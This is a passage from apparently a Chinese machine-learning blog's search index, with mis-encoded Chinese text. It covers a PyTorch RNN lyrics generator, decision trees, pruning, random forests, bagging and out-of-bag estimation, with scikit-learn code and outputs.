self.sent_len # å¥å­æ€»æ•° def __len__(self): return self.sent_num def __getitem__(self,idx): if idx \u0026lt; 0: idx =0 if idx \u0026gt; self.word_num-self.sent_len-1 : idx = self.word_num-self.sent_len-1 x = torch.tensor(self.all_indix[idx:idx+self.sent_len]) y = torch.tensor(self.all_indix[idx+1:idx+self.sent_len+1]) return x,y 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # æ„å»ºæ¨¡å‹ class LyricsGenerator(nn.Module): def __init__(self,word_count): super(LyricsGenerator,self).__init__() self.ebd = nn.Embedding(word_count,128) # å°†ä¸€ä¸ªåˆ†æç»´åº¦è½¬ä¸º128 self.rnn = nn.RNN(input_size=128,hidden_size=128,num_layers=4) self.out = nn.Linear(128,word_count) def forward(self,inputs,hidden): emb = self.ebd(inputs).permute(1,0,2) output,hidden = self.rnn(emb,hidden) output = self.out(output.reshape((-1,output.shape[-1]))) return output,hidden def init_hidden(self,bs=2): return torch.zeros(4,bs,128) 1 2 3 word_index,index_word,all_index,dict_len = Tokenizer() word_dataset = LyricsDataset(all_index,10) word_dataset.__getitem__(0) Building prefix dict from the default dictionary ... Loading model from cache C:\\Users\\leuco\\AppData\\Local\\Temp\\jieba.cache Loading model cost 0.566 seconds. Prefix dict has been built successfully. (tensor([0, 1, 2, 3, 0, 4, 5, 6, 7, 8]), tensor([1, 2, 3, 0, 4, 5, 6, 7, 8, 3])) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # æ¨¡å‹è®­ç»ƒ def train_model(model,data_loader,epochs=100,device=\u0026#39;cpu\u0026#39;): model.train() model.to(device) criterion = nn.CrossEntropyLoss() optimizer = optim.Adam(model.parameters(),lr=0.001) for epoch in range(epochs): total_loss = 0 total = 0 for batch_index,(X,y) in enumerate(data_loader): X = X.to(device) y = y.to(device) hidden = model.init_hidden() hidden = hidden.to(device) optimizer.zero_grad() output,hidden = model(X,hidden) y = torch.transpose(y,0,1).contiguous().view(-1) # å±•å¹³ä¸ºä¸€ç»´ loss = criterion(output,y.long()) loss.backward() optimizer.step() total_loss+=loss total+=1 if epoch % 10 == 0: print(f\u0026#34;Epoch[{epoch}] : Loss = {total_loss/total:.5f}\u0026#34;) data_loader = DataLoader( word_dataset, shuffle=True, batch_size=2, drop_last=True ) model = LyricsGenerator(dict_len) train_model(model,data_loader,device=\u0026#39;cuda\u0026#39;) Epoch[0] : Loss = 3.31849 Epoch[10] : Loss = 0.33738 1 2 3 ```python torch.save(model.state_dict(),\u0026#39;./Model/6_Lyrics_Generator/Model.pth\u0026#39;) 1 2 3 # æ¨¡å‹åŠ è½½ model = LyricsGenerator(10) model.load_state_dict(torch.load(\u0026#39;./Model/6_Lyrics_Generator/Model.pth\u0026#39;, weights_only=True)) \u0026lt;All keys matched successfully\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # æ¨¡å‹è¯„ä¼° def generate_lyrics(model,word_index,index_word,start_words,sentence_length,device=\u0026#39;cpu\u0026#39;): model.to(device) hidden = model.init_hidden(bs=1).to(device) model.to(device) word_idx = word_index[start_words] generate_sentence = [word_idx] for _ in range(sentence_length): output,hidden = model(torch.tensor([[word_idx]]).to(device),hidden) word_idx = torch.argmax(output).cpu().item() generate_sentence.append(word_idx) for idx in generate_sentence: print(index_word[idx],end=\u0026#39;\u0026#39;) 1 2 3 start = \u0026#39;çŸ¥é“\u0026#39; word_len = 100 generate_lyrics(model,word_index,index_word,start,word_len) çŸ¥é“è¿™é‡Œå¾ˆç¾ä½†å®¶ä¹¡çš„ä½ æ›´ç¾åŸæ¥æˆ‘åªæƒ³è¦ä½  é™ªæˆ‘å»åƒæ±‰å ¡ è¯´ç©¿äº†å…¶å®æˆ‘çš„æ„¿æœ›å°±æ€ä¹ˆå° å°±æ€ä¹ˆæ¯å¤©ç¥ˆç¥·æˆ‘çš„å¿ƒè·³ä½ çŸ¥é“ æµåœ¨ä¼Šæ–¯å¦å ¡ å´åªæƒ³ä½ å’Œæ±‰å ¡ æˆ‘æƒ³è¦ä½ çš„å¾®ç¬‘æ¯å¤©éƒ½èƒ½çœ‹åˆ° æˆ‘çŸ¥é“è¿™é‡Œå¾ˆç¾ä½†å®¶ä¹¡çš„ä½ æ›´ç¾åŸæ¥æˆ‘åªæƒ³è¦ä½  é™ªæˆ‘å»åƒæ±‰å ¡ è¯´ç©¿äº†å…¶å®æˆ‘çš„æ„¿æœ›å°±æ€ä¹ˆå° å°±æ€ä¹ˆæ¯å¤© ","date":"2025-12-02T20:51:17+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/60aa0004-c259-49eb-b742-6515691c6d92_hu_de4706188334dd7a.png","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/","title":"æœºå™¨å­¦ä¹ -ç¥ç»ç½‘ç»œ"},{"content":" ç›®å½• å†³ç­–æ ‘ï¼ˆDecision-Making Treeï¼‰ é›†æˆå­¦ä¹ ï¼ˆEnsemble Learningï¼‰ åˆ†ç±» Bagging Boosting éšæœºæ£®æ—ï¼ˆRandom Forestï¼‰ è¢‹å¤–æ•°æ®ï¼ˆOOBï¼ŒOut of bag dataï¼‰ AdaBoostï¼ˆAdaptive Boostingï¼Œè‡ªé€‚åº”å¢å¼ºï¼‰ GBDTï¼ˆæ¢¯åº¦æå‡å†³ç­–æ ‘ï¼‰ é›†æˆå­¦ä¹ ï¼ˆEnsemble Learningï¼‰ å†³ç­–æ ‘ï¼ˆDecision-Making Treeï¼‰ å†³ç­–æ ‘æ˜¯æœ‰ç›‘ç£æœºå™¨å­¦ä¹ çš„ä¸€ç§ æ¨¡å‹ç”Ÿæˆï¼šé€šè¿‡å¤§é‡æ•°æ®ç”Ÿæˆä¸€æ£µéå¸¸å¥½çš„æ ‘ï¼ˆå¯»æ‰¾æœ€ä¼˜çš„åˆ†è£‚æ¡ä»¶ï¼‰ é¢„æµ‹ï¼šæŒ‰ç…§ç”Ÿæˆå¥½çš„æ ‘çš„æ ‡å‡†è½åˆ°æŸä¸€ä¸ªå¶å­èŠ‚ç‚¹ä¸Š ç®—æ³•æ€æƒ³ $$ \\begin{aligned} \u0026 function \\ \\operatorname{DecisionTree}(data:\\mathcal{D}=\\{(x_n,y_n)\\}_{n=1}^N) \\\\ \u0026\\qquad \\operatorname{if} \\ termination\\ citeria met: \\qquad\\text{//å¦‚æœæ»¡è¶³ç»ˆæ­¢æ¡ä»¶}\\\\ \u0026\\qquad\\qquad \\begin{aligned} \\operatorname{return}\\ base\\ hypothesis\\ g_t(x) \\qquad\\text{//è¿”å›ç¬¬tä¸ªå¶å­èŠ‚ç‚¹çš„å€¼} \\end{aligned}\\\\ \u0026\\qquad\\operatorname{else}\\\\ \u0026\\qquad\\qquad \\begin{aligned} \u0026 \\operatorname{learn}\\ branching\\ criteria\\ b(x) \\qquad\\text{//å­¦ä¹ æœ€ä¼˜åˆ†è£‚æ¡ä»¶b(x)ï¼Œè¯¥æ¡ä»¶äº§ç”ŸCä¸ªç»“æœåˆ†æ”¯}\\\\ \u0026 split\\ \\mathcal{D}\\ to\\ C\\ parts\\ \\mathcal{D}_C=\\{(x_n,y_n):b(x_n)=c\\} \\qquad//æŠŠå½“å‰çš„æ•°æ®é›†\\mathcal{D}åˆ‡åˆ†æˆCä¸ªéƒ¨åˆ† \\\\ \u0026 \\operatorname{build}\\ sub-tree\\ G_C\\ \\leftarrow \\ \\operatorname{DecisionTree}(\\mathcal{D}_C) \\qquad\\text{//é€’å½’åœ¨å­ç»“ç‚¹ä¸Šå†è¿›è¡Œå­æ ‘åˆ’åˆ†}\\\\ \u0026 \\operatorname{return}\\ G(x)=\\displaystyle{\\sum^C_{c=1}[[b(x)==c]]G_C(x)} \\qquad\\text{//è¿”å›æ•´ä½“æ•°ç»“æ„è¡¨è¾¾å¼} \\end{aligned} \\end{aligned} $$ ç”Ÿæˆå†³ç­–æ ‘æ‰€éœ€åˆ†è£‚æŒ‡æ ‡â€”â€”ç¦»æ•£é—®é¢˜ï¼ˆ$D_cä¸ºç‰¹å¾Açš„ç¬¬cä¸ªå–å€¼æ ·æœ¬å­é›†$ï¼‰ Giniç³»æ•°ï¼š å…¬å¼ï¼š $$\\displaystyle{Gini^{init}(p)=\\sum_{k=1}^Kp_k(1-p_k)=1-\\sum_{k=1}^Kp_k^2}$$ åŸºå°¼ç³»æ•°è¶Šå°ï¼Œä»£è¡¨Dé›†åˆä¸­çš„æ•°æ®çº¦çº¯ï¼Œæ‰€ä»¥å¯ä»¥è®¡ç®—åˆ†è£‚å‰çš„å€¼åœ¨æŒ‰ç…§æŸä¸ªç»´åº¦å¯¹æ•°æ®é›†è¿›è¡Œåˆ’åˆ†ï¼Œç„¶åè®¡ç®—å¤šä¸ªèŠ‚ç‚¹çš„Giniç³»æ•°ï¼š$$\\displaystyle{Gini^{Divided}(D,A)=\\sum_{c \\in Values(A)}\\frac{|D_c|}{|D|}Gini(D_c) }$$ æ”¶ç›Šå‡½æ•°ï¼š$$Gain(D,A)=Gini^{init}(D)-Gini^{Devided}(D,A)$$ ä¿¡æ¯å¢ç†µï¼š$H(X) \\simeq Gini(X)$ å…¬å¼ï¼š $$\\displaystyle{H(N) = -\\sum_j P(\\omega_j)\\log_2P(\\omega_j) }$$ åˆ’åˆ†åçš„å¤šä¸ªç»“ç‚¹çš„ç†µä¹‹å’Œï¼š$$\\displaystyle{H^{Devided}(D,A)=-\\sum_{c \\in Values(A)}\\frac{|D_c|}{|D|}H(D_c) }$$ æ”¶ç›Šå‡½æ•°ï¼š$$\\displaystyle{Gain(D,A)=H^{init}(D)-H^{Devided}(D,A)}$$ ä¿¡æ¯å¢ç›Šç‡ ç‰¹å¾Açš„å›ºæœ‰å€¼ï¼ˆIntrinsic Valueï¼‰ï¼š$$\\operatorname{IV}(A)=\\displaystyle{-\\sum_{c \\in Values(A)}\\frac{|D_c|}{|D|}log_2\\frac{|D_c|}{|D|}}$$ ä¿¡æ¯å¢ç›Šç‡ï¼š$$\\displaystyle{GainRatio(D,A)=\\frac{Gain(D,A)}{IV(A)}}$$ MSEï¼ˆå›å½’é—®é¢˜ï¼‰ å‰ªæï¼šè§£å†³è¿‡æ‹Ÿåˆé—®é¢˜ å‰å‰ªæï¼šåœ¨æ„å»ºå†³ç­–æ ‘çš„è¿‡ç¨‹ä¸­ï¼Œé™å®šæœ€å°å¶å­å†…çš„èŠ‚ç‚¹æ•°ã€æœ€å¤§æ·±åº¦ç­‰æ¡ä»¶ åå‰ªæ: REPâ€”â€”é”™è¯¯ç‡é™ä½å‰ªæ PEPâ€”â€”æ‚²è§‚å‰ªæ CCPâ€”â€”ä»£ä»·å¤æ‚åº¦å‰ªæ CCPä¸ºå­æ ‘ $ T_t $ å®šä¹‰äº†ä»£ä»·ï¼ˆcostï¼‰å’Œå¤æ‚åº¦ï¼ˆcomplexityï¼‰ï¼Œä»¥åŠä¸€ä¸ªå¯ç”±ç”¨æˆ·è®¾ç½®çš„è¡¡é‡ä»£ä»·ä¸å¤æ‚åº¦ä¹‹é—´å…³ç³»çš„å‚æ•° $ \\alpha^* $ ï¼Œå…¶ä¸­ä»£ä»·æŒ‡çš„æ˜¯åœ¨å‰ªæè¿‡ç¨‹ä¸­å› å­æ ‘ $ T_t $ è¢«å¶å­èŠ‚ç‚¹æ›¿ä»£è€Œå¢åŠ çš„é”™åˆ†æ ·æœ¬ï¼Œå¤æ‚åº¦è¡¨ç¤ºå‰ªæåå­æ ‘ $ T_t $ å‡å°‘çš„å¶å­èŠ‚ç‚¹æ•°é‡ã€‚ $ \\alpha $ è¡¨ç¤ºå‰ªæåæ ‘çš„å¤æ‚åº¦å‡ä½ç¨‹åº¦ä¸ä»£ä»·ä¹‹é—´çš„å…³ç³»ã€‚å½“ $ \\alpha^* \u0026lt; \\alpha $ æ—¶å°±å¯ä»¥å°†è¯¥èŠ‚ç‚¹ä¸‹çš„å­æ ‘å‰ªæ‰ï¼Œå½“å‰èŠ‚ç‚¹ä½œä¸ºå¶å­èŠ‚ç‚¹ $$ \\begin{aligned} \u0026\\alpha = \\displaystyle{\\frac{R(t)-R(T_t)}{|N_1|-1}}\\\\ å…¶ä¸­ï¼Œ\u0026|N_1|:å­æ ‘T_tä¸­çš„å¶å­èŠ‚ç‚¹æ•° \\\\ \u0026 R(t)ä¸ºç»“ç‚¹tçš„é”™è¯¯ä»£ä»·ï¼ŒR(t)=r(t)*p(t) \\\\ \u0026 r(t)ä¸ºç»“ç‚¹tçš„é”™åˆ†æ ·æœ¬ç‡ï¼Œp(t)ä¸ºè½å…¥ç»“ç‚¹tçš„æ ·æœ¬å æ‰€æœ‰æ ·æœ¬çš„æ¯”ä¾‹ \\\\ \u0026 R(T_t)ä¸ºå­æ ‘T_tçš„é”™è¯¯ä»£ä»·ï¼ŒR(T_t)=\\displaystyle{\\sum_iR(i)},iä¸ºå­æ ‘T_tçš„å¶å­èŠ‚ç‚¹ \\end{aligned} $$ å„ç‰¹å¾é‡è¦æ€§è¯„ä¼°æŒ‡æ ‡ï¼š$$FI(j)=\\displaystyle{\\frac{\\displaystyle{\\sum_{t\\ use\\ j}N_tÂ·Gain(t)}}{\\displaystyle{\\sum_{all\\ t}N_tÂ·Gain(t)}}}$$ï¼Œå…¶ä¸­ $ N_t $ æ˜¯åˆ†è£‚èŠ‚ç‚¹ $ t $ çš„æ ·æœ¬æ•° åœ¨çº¿ç»˜åˆ¶å·¥å…·ï¼šGraphviz Online 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 # å†³ç­–æ ‘å®ç°é¸¢å°¾èŠ±åˆ†ç±» import pandas as pd import numpy as np from sklearn.datasets import load_iris from sklearn.tree import DecisionTreeClassifier from sklearn.tree import export_graphviz from sklearn.model_selection import train_test_split from sklearn.metrics import accuracy_score import matplotlib.pyplot as plt import matplotlib as mpl from itertools import product from sklearn.preprocessing import StandardScaler from sklearn.preprocessing import MinMaxScaler from sklearn.pipeline import Pipeline def show(X,y,names,species): s = [t for t in sorted(list(set([tuple(sorted(p)) for p in product([0,1,2,3],repeat=2)]))) if t[0]!=t[1]] fig,axs = plt.subplots(2,3,figsize=(12,7)) axs = axs.flatten() for index,((x1,x2),ax) in enumerate(zip(s,axs)): [ax.scatter(X[y==lab][:,x1],X[y==lab][:,x2],label=f\u0026#34;[{lab}]{species[lab]}\u0026#34;) for lab in set(y)] ax.set_xlabel(f\u0026#34;{names[x1]}:Data[{x1}]\u0026#34;) ax.set_ylabel(f\u0026#34;{names[x2]}:Data[{x2}]\u0026#34;) ax.legend() plt.tight_layout() plt.show() iris = load_iris() data = pd.DataFrame(iris.data) data.columns = iris.feature_names data[\u0026#39;species\u0026#39;] = iris.target X,y = (iris.data,iris.target) show(X,y,data.columns,iris.target_names) X_train,X_test,y_train,y_test = train_test_split(X,y,train_size=0.8,random_state=42) pip = Pipeline(steps = [ (\u0026#39;dtc\u0026#39;,DecisionTreeClassifier(max_depth=8,criterion=\u0026#39;gini\u0026#39;,random_state=428)), ]) pip.fit(X_train,y_train) print(f\u0026#34;Accuracy of the test set (four features): {pip.score(X_test,y_test)}\u0026#34;) export_graphviz( pip[\u0026#39;dtc\u0026#39;], out_file=\u0026#34;Output/Iris_Decision_Tree/tree_dot.dot\u0026#34;, filled=True, rounded=True, node_ids=True, class_names=None ) print(f\u0026#34;feature importances: {pip[\u0026#39;dtc\u0026#39;].feature_importances_}\u0026#34;) #ç‰¹å¾0ä¸ç‰¹å¾1çš„é‡è¦æ€§æä½ pip.fit(X_train[:,2:4],y_train) print(f\u0026#34;Accuracy of the test set (two features): {pip.score(X_test[:,2:4],y_test)}\u0026#34;) export_graphviz( pip[\u0026#39;dtc\u0026#39;], out_file=\u0026#34;Output/Iris_Decision_Tree/tree1_dot.dot\u0026#34;, filled=True, rounded=True, node_ids=True ) #æ·±åº¦æ¢æµ‹ï¼šå¯»æ‰¾æœ€ä¼˜æ ‘æ·± scores = {} for depth in np.arange(1,15): dtc = DecisionTreeClassifier(max_depth=depth,criterion=\u0026#39;gini\u0026#39;,random_state=428) dtc.fit(X_train[:,2:4],y_train) scores[str(depth)]=dtc.score(X_test[:,2:4],y_test) print(scores) â€‹ â€‹\nAccuracy of the test set (four features): 1.0 feature importances: [0.03334028 0. 0.88947325 0.07718647] Accuracy of the test set (two features): 1.0 {'1': 0.6333333333333333, '2': 0.9666666666666667, '3': 1.0, '4': 1.0, '5': 1.0, '6': 1.0, '7': 1.0, '8': 1.0, '9': 1.0, '10': 1.0, '11': 1.0, '12': 1.0, '13': 1.0, '14': 1.0} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # å†³ç­–æ ‘æ‹Ÿåˆå›å½’æ¨¡å‹ from sklearn.tree import DecisionTreeRegressor import numpy as np import matplotlib.pyplot as plt from sklearn.model_selection import train_test_split from sklearn.tree import export_graphviz colors = [ \u0026#39;#e41a1c\u0026#39;, \u0026#39;#377eb8\u0026#39;, \u0026#39;#4daf4a\u0026#39;, \u0026#39;#984ea3\u0026#39;, # çº¢ è“ ç»¿ ç´« \u0026#39;#ff7f00\u0026#39;, \u0026#39;#ffff33\u0026#39;, # æ©™ é»„ \u0026#39;#1b9e77\u0026#39;, \u0026#39;#d95f02\u0026#39;, \u0026#39;#7570b3\u0026#39;, \u0026#39;#e7298a\u0026#39;, # é’ æ£• é› æ´‹çº¢ \u0026#39;#66a61e\u0026#39;, \u0026#39;#666666\u0026#39; # è‰ç»¿ æ·±ç° ] np.random.shuffle(colors) def mapping(x): np.random.seed(20030428) return np.sin(x**2/2) + np.random.randn(len(x),1)*0.1 # ç‰¹å¾æ•° n = 1 # æ•°æ®é‡ m = 10000 # éšæœºç”Ÿæˆ x åºåˆ— X = np.random.rand(m,n) * 10 - 4 # æ¨¡æ‹Ÿéçº¿æ€§å›å½’åˆ†å¸ƒ y = mapping(X) plt.scatter(X,y,s=0.05) X_train,X_test,y_train,y_test = train_test_split(X,y,train_size=0.7,random_state=428) # plt.scatter(X_train,y_train) index = X_test[:,0].argsort(axis=0) X_test = X_test[index] y_test = y_test[index] print(len(X_test),len(y_test)) scores = {} for depth,color in zip(np.arange(3,15),colors): dtr = DecisionTreeRegressor(max_depth=depth,random_state=428) dtr.fit(X_train,y_train) scores[str(depth)] = dtr.score(X_test,y_test) export_graphviz(dtr,out_file=\u0026#34;Output/Practice01_Reg_Decision_Tree/depth_\u0026#34;+str(depth)+\u0026#34;.dot\u0026#34;) if depth in [3,6,9]: plt.plot(X_test,dtr.predict(X_test),c=color,ms=0.05,label=\u0026#34;depth=\u0026#34;+str(depth)) plt.legend() print(scores) depth = int(list(scores.keys())[np.argmax(list(scores.values()))]) print(depth,scores[str(depth)]) 3000 3000 {'3': 0.6082955315717642, '4': 0.7350159653921886, '5': 0.8994966783739446, '6': 0.9402911147144416, '7': 0.9630064233693199, '8': 0.969353657452782, '9': 0.9713638580425933, '10': 0.9699000308717682, '11': 0.9676749619741486, '12': 0.9648717916673495, '13': 0.963189780460903, '14': 0.9609148583309566} 9 0.9713638580425933 é›†æˆå­¦ä¹ ï¼ˆEnsemble Learningï¼‰ Advance-Organizerï¼šå‡è®¾æœ‰10ä¸ªå†³ç­–æ ‘ å•å†³ç­–æ ‘ç®—æ³•ï¼šæ‰¾åˆ°10ä¸ªå†³ç­–æ ‘ä¸­æœ€å¯é çš„å†³ç­–æ ‘æ ‘è¿›è¡Œé¢„æµ‹ éšæœºæ£®æ—ç®—æ³•ï¼šæ‰€æœ‰å†³ç­–æ ‘è¿›è¡ŒæŠ•ç¥¨ï¼Œå°‘æ•°æœä»å¤šæ•° Adaboostï¼šæ›´å¯é çš„å†³ç­–æ ‘åˆ†åˆ°æ›´å¤šçš„ç¥¨æ•° é›†æˆå­¦ä¹ çš„å•ä¸ªå¼±å­¦ä¹ å™¨å¯ä»¥åŸºäºä¸åŒçš„å­¦ä¹ ç­–ç•¥æ„å»º åˆ†ç±» Bagging è®­ç»ƒï¼šæœ‰æ”¾å›åœ°å¯¹åŸå§‹è®­ç»ƒé›†è¿›è¡Œå‡åŒ€æŠ½æ ·ï¼ˆBootstrapæŠ½æ ·ï¼‰ï¼Œå°†æŠ½æ ·ç»“æœç”¨äºå¹¶è¡Œç‹¬ç«‹è®­ç»ƒ $g(x)$ æ¨¡å‹ï¼šåŒæƒé‡æŠ•ç¥¨ï¼Œå¯¹äºåˆ†ç±»ä»»åŠ¡å°‘æ•°æœä»å¤šæ•°ï¼›å¯¹äºå›å½’ä»»åŠ¡å–å¹³å‡ ä¾‹å¦‚ï¼šrandom forest Boosting è®­ç»ƒï¼šé€šè¿‡è®­ç»ƒé›†è®­ç»ƒ $g_i$ ï¼Œå†é€šè¿‡ $ g_k(k\\in{1,2\\dots i}) $ çš„é¢„æµ‹ç»“æœè°ƒæ•´è®­ç»ƒé›†ï¼Œè®­ç»ƒå¾—åˆ° $ g_{i+1} $ æ¨¡å‹ï¼šæŒ‰ç…§æŸä¸ªæƒé‡åºåˆ—è¿›è¡ŒæŠ•ç¥¨ï¼Œå¯¹äºå›å½’ä»»åŠ¡æ±‚åŠ æƒå¹³å‡ ä¾‹å¦‚ï¼šAdaboostï¼ŒGBDTï¼ŒXgboost éšæœºæ£®æ—ï¼ˆRandom Forestï¼‰ Baggingæ€æƒ³ + å†³ç­–æ ‘åŸºå­¦ä¹ å™¨ + åŒæƒæŠ•ç¥¨ æ¨¡å‹è®­ç»ƒï¼š é‡‡æ ·ï¼šæœ‰æ”¾å›çš„ä»åŸå§‹æ•°æ®ä¸­éšæœºæŠ½å–éƒ¨åˆ†æ ·æœ¬æˆ–ç‰¹å¾ è®­ç»ƒï¼šä½¿ç”¨æ¯æ¬¡é‡‡æ ·è·å¾—çš„å­è®­ç»ƒé›†åˆ†åˆ«å¹¶è¡Œè®­ç»ƒå†³ç­–æ ‘ æ¨¡å‹ï¼šéšæœºæ£®æ—æŠ•ç¥¨ï¼ˆåŒæƒæŠ•ç¥¨ï¼Œå°‘æ•°æœä»å¤šæ•°ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 from sklearn.ensemble import RandomForestClassifier,BaggingClassifier,VotingClassifier # é›†æˆå­¦ä¹ å™¨ from sklearn.linear_model import LogisticRegression # é€»è¾‘å›å½’ from sklearn.svm import SVC # æ”¯æŒå‘é‡æœº from sklearn.tree import DecisionTreeClassifier # å†³ç­–æ ‘ åŸºå­¦ä¹ å™¨ from sklearn.model_selection import train_test_split from sklearn.datasets import load_iris data = load_iris() X,y = iris.data,iris.target X_train,X_test,y_train,y_test = train_test_split(X,y,train_size=0.8,random_state=428) rfc = RandomForestClassifier( # éšæœºæ£®æ— criterion=\u0026#39;gini\u0026#39;, n_estimators=15, # å¤šå°‘æ£µæ ‘ # max_depth=8, # å•æ£µæ ‘æœ€å¤§æ·±åº¦ max_leaf_nodes=16, # æœ€å¤§å¶å­èŠ‚ç‚¹æ•° n_jobs=-1, # å¯ç”¨æ‰€æœ‰CPUèµ„æº max_samples = None, # å•æ¬¡æŠ½å–çš„æ ·æœ¬æ•°é‡ã€‚é»˜è®¤æœ€å¤§æ•°é‡çš„æœ‰æ”¾å›éšæœºå–æ · max_features=\u0026#39;sqrt\u0026#39;, bootstrap = True, random_state=428, oob_score=True, # OOBç®—æ³•ï¼Œå…·ä½“è§ä¸‹æ–‡ # verbose=True ) rfc.fit(X_train,y_train) print(f\u0026#34;RandomForest Accuracy: {rfc.score(X_test,y_test)}\u0026#34;) print(f\u0026#34;RandomForest OOB Score: {rfc.oob_score_}\u0026#34;) # OOB_SCOREä¸ºæ— åä¼°è®¡ bgc = BaggingClassifier( estimator=LogisticRegression(), # ç”¨é€»è¾‘å›å½’ä½œä¸ºåŸºå­¦ä¹ å™¨ï¼Œé»˜è®¤ä¸ºå†³ç­–æ ‘ n_estimators=15, # åŸºå­¦ä¹ å™¨ä¸ªæ•° # max_samples=None, # å•æ¬¡æŠ½æ ·çš„æ ·æœ¬ä¸ªæ•° max_features=0.8, # éšæœºé€‰æ‹©ç‰¹å¾ n_jobs=-1, bootstrap = True, random_state=428, oob_score=True, # OOBç®—æ³•ï¼Œå…·ä½“è§ä¸‹æ–‡ # verbose=True ) bgc.fit(X_train,y_train) print(f\u0026#34;Bagging Accuracy: {bgc.score(X_test,y_test)}\u0026#34;) print(f\u0026#34;Bagging OOB Score: {bgc.oob_score_}\u0026#34;) # OOB_SCOREä¸ºæ— åä¼°è®¡ vtc = VotingClassifier( estimators=[ (\u0026#39;lr\u0026#39;,LogisticRegression()), (\u0026#39;svm\u0026#39;,SVC()), (\u0026#39;DT\u0026#39;,DecisionTreeClassifier()) ], n_jobs=-1, # å…¨éƒ¨æ ¸ # verbose=True ) vtc.fit(X_train,y_train) print(f\u0026#34;Voting Accuracy: {bgc.score(X_test,y_test)}\u0026#34;) RandomForest Accuracy: 0.9666666666666667 RandomForest OOB Score: 0.95 Bagging Accuracy: 0.9666666666666667 Bagging OOB Score: 0.975 Voting Accuracy: 0.9666666666666667 è¢‹å¤–æ•°æ®ï¼ˆOOBï¼ŒOut of bag dataï¼‰ ä¸€æ¡æ•°æ®Nè½®éƒ½æ²¡æœ‰è¢«æŠ½åˆ°çš„æ¦‚ç‡ä¸º $\\displaystyle{\\underset{N\\rightarrow\\infty}{limit}\\ (1-\\frac{1}{N})^N = \\frac{1}{e} \\approx 36.79%}$ æ•´ä¸ªè®­ç»ƒè¿‡ç¨‹ä¸­æœ‰å¤§çº¦ 36.79% çš„æ•°æ®æœªè¢«ä½¿ç”¨ï¼ˆè¿™éƒ¨åˆ†æ•°æ®ç§°ä¸ºOOBï¼‰ï¼ŒOOBä¸ºå¤©ç„¶éªŒè¯é›† æ€æƒ³ï¼šæ— éœ€åƒäº¤å‰éªŒè¯ä¸€æ ·æ˜¾å¼åœ°å°†æ•°æ®é›†åˆ’åˆ†ä¸ºè®­ç»ƒé›†å’ŒéªŒè¯é›†ï¼Œå°±å¯ä»¥åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­å¤©ç„¶ã€æ— ååœ°è¯„ä¼°æ¨¡å‹åœ°æ³›åŒ–èƒ½åŠ›ï¼Œè§£å†³äº†éªŒè¯é›†éœ€è¦é¢å¤–æ•°æ®æˆ–å‡å°‘è®­ç»ƒæ•°æ®é‡çš„é—®é¢˜ã€‚OOBåˆ¤æ–­ä»…åŸºäºæ ·æœ¬æ˜¯å¦è¢«åŒ…å«åœ¨Bootstrapè®­ç»ƒé›†ä¸­ï¼Œè€Œä¸ç‰¹å¾ä½¿ç”¨æ— å…³ å…·ä½“ç®—æ³•è¿‡ç¨‹ ç¬¬ä¸€æ­¥ï¼šè®­ç»ƒé˜¶æ®µï¼ˆå‡è®¾åŸå§‹è®­ç»ƒé›† $ D $ ï¼Œå¤§å°ä¸º $ N $ ã€‚æ„å»ºä¸€ä¸ªåŒ…å« $ T $ è¯¾å†³ç­–æ ‘çš„éšæœºæ£®æ—ï¼‰ å¯¹æ¯æ£µæ ‘ $ t_i(i = 1,2\\dots T) $ è¿›è¡Œ $ Bootstrap $ æŠ½æ · ä» $ D $ ä¸­æœ‰æ”¾å›åœ°éšæœºæŠ½å– $ N $ ä¸ªæ ·æœ¬ï¼Œå½¢æˆè¯¥æ ‘çš„ $ Bootstrap $ è®­ç»ƒé›† $ D_i $ åŒæ—¶ï¼Œæ²¡æœ‰è¢«æŠ½ä¸­çš„æ ·æœ¬æ„æˆè¢‹å¤–æ ·æœ¬é›† $ OOB_i $ ã€‚æ¯ä¸ªæ ·æœ¬ä½œä¸ºè¢‹å¤–æ ·æœ¬çš„æ¦‚ç‡ä¸º36.79% ç”¨ $ D_i $ è®­ç»ƒç¬¬ $ i $ è¯¾å†³ç­–æ ‘ $ t_i $ è®­ç»ƒæ—¶ï¼Œéšæœºæ£®æ—è¿˜ä¼šä»æ‰€æœ‰ç‰¹å¾ä¸­éšæœºé€‰æ‹©ä¸€éƒ¨åˆ†ç‰¹å¾è¿›è¡ŒèŠ‚ç‚¹çš„åˆ†è£‚ï¼Œä»¥å¢åŠ æ ‘çš„å¤šæ ·æ€§ã€‚ è®°å½•æ¯ä¸ªæ ·æœ¬çš„OOBé¢„æµ‹å™¨ å¯¹äºä¸€ä¸ªç‰¹å®šçš„æ ·æœ¬ $ (x,y) $ ï¼Œæ‰¾å‡ºæ‰€æœ‰æ²¡æœ‰ä½¿ç”¨å®ƒè¿›è¡Œè®­ç»ƒçš„æ ‘ã€‚å³æ‰¾åˆ°æ‰€æœ‰ $ OOB_i,(x,y)\\in OOB_i $ ã€‚è¿™äº›æ ‘ç»„æˆäº†æ ·æœ¬ $ (x,y) $ çš„OOBé¢„æµ‹å™¨ ç¬¬äºŒæ­¥ï¼šè¯„ä¼°OOBè¯¯å·®ï¼ˆæ³›åŒ–è¯¯å·®ä¼°è®¡ï¼‰ å¯¹æ¯ä¸ªæ ·æœ¬ $ (x,y) $ è¿›è¡ŒOOBé¢„æµ‹ 